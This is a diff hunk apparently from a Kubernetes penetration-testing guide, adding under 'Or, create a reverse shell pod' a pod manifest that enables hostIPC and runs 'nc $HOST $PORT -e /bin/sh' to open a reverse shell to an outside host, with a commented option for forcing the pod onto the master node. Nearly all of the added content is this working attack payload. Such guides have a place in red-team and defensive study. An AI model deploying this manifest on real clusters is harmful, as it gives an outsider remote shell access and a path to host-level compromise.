@@ -43,6 +43,26 @@ kubectl -n [namespace] exec -it pod-hostipc-only -- bash
 ```
 
 ## Or, create a reverse shell pod
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-hostipc-revshell
+  labels:
+    app: hostipc-revshell
+spec:
+  hostIPC: true
+  containers:
+  - image: busybox
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+
+    imagePullPolicy: IfNotPresent
+    name: hostipc--revshell
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  restartPolicy: Always
+```
 [pod-hostipc-only-revshell.yaml](pod-hostipc-only-revshell.yaml)
 
 #### Set up listener
